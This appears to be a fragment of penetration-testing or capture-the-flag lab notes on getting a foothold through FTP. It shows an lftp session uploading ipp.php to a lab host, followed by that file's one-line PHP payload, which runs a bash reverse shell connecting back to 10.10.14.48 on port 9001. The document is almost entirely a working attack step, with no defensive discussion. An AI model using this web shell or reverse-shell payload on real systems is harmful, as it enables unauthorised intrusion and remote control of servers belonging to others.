# FTP
## Uploading a shell
Logged in with an FTP with account created via [[25 - Gym-Club XSS]]
```bash
lftp clarkey@10.10.10.208:/development-test> put ipp.php
75 bytes transferred in 1 second (75 B/s)
lftp clarkey@10.10.10.208:/development-test> dir
-rw-r--r--    1 1002     1002           75 Apr 01 13:03 ipp.php
```

ipp.php
```php
<?php system("bash -c 'bash -i >& /dev/tcp/10.10.14.48/9001 0>&1'"); ?>
```
